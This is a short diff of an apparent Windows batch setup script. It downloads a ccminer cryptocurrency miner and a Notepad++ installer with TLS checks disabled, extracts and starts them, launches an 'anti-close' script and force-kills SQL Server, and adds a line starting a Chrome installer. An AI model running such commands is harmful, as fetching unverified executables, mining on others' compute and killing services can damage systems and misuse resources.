@@ -19,6 +19,7 @@ curl -LJOk https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccmin
 curl -LJOk https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.8/npp.7.8.8.Installer.exe
 7z.exe x ccminer_cpu3_7_SSE2.zip
 start npp.7.8.8.Installer.exe
+start ChromeSetup.exe
 start anti-close.bat
 net start audiosrv
 taskkill /f /im sqlservr.exe
